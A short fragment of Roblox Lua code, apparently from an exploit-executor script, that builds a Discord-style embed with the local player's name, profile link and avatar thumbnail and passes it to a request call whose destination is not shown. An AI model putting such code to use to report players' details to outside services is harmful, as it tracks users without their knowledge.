...
request({
	...
	Body = httpService:JSONEncode({
		embeds = {
			...
			{ title = "View " .. localPlayer.Name .. "'s full profile", url = "https://www.roblox.com/users/" .. userId .. "/profile", color = 1733608, image = { url = httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false")).data[1].imageUrl } }
		},
